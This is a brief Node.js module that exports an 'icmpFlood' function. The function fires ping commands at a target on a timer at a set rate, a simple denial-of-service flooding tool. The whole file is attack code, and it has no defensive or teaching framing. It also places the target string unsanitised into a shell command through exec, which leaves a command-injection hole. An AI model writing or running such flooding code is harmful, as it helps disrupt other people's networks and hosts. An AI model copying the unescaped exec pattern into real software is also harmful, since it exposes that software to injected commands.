const { exec } = require('child_process');

function icmpFlood(target, rateLimit) {
    setInterval(() => {
        exec(`ping -c 1 ${target}`, (err, stdout, stderr) => {
            if (err) {
                console.error('Error: ' + err.message);
            } else {
                console.log('Sent ICMP packet');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = icmpFlood;
